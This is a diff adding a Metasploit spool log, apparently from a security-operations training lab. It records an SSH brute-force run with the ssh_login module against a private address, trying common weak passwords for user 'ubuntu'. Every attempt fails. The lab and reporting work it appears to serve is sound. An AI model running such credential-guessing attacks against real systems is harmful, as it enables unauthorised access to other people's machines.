@@ -1,0 +1,19 @@
+[1m[34m[*][0m Spooling to file /home/kali/soc-lab/reports/metasploit-results.txt...
+[4mmsf[0m auxiliary([1m[31mscanner/ssh/ssh_login[0m) [0m> run
+[0m[1m[34m[*][0m 192.168.65.4:22       - Starting bruteforce
+[1m[34m[*][0m 192.168.65.4:22 SSH - Testing User/Pass combinations
+[1m[31m[-][0m 192.168.65.4:22       - Failed: 'ubuntu:password'
+[1m[33m[!][0m No active DB -- Credential data will not be saved!
+[1m[31m[-][0m 192.168.65.4:22       - Failed: 'ubuntu:password123'
+[1m[31m[-][0m 192.168.65.4:22       - Failed: 'ubuntu:admin'
+[1m[31m[-][0m 192.168.65.4:22       - Failed: 'ubuntu:ubuntu'
+[1m[31m[-][0m 192.168.65.4:22       - Failed: 'ubuntu:root'
+[1m[31m[-][0m 192.168.65.4:22       - Failed: 'ubuntu:123456'
+[1m[31m[-][0m 192.168.65.4:22       - Failed: 'ubuntu:qwerty'
+[1m[31m[-][0m 192.168.65.4:22       - Failed: 'ubuntu:welcome'
+[1m[31m[-][0m 192.168.65.4:22       - Failed: 'ubuntu:letmein'
+[1m[31m[-][0m 192.168.65.4:22       - Could not connect: connection closed by remote host
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/ssh/ssh_login[0m) [0m> spool off
+[0m
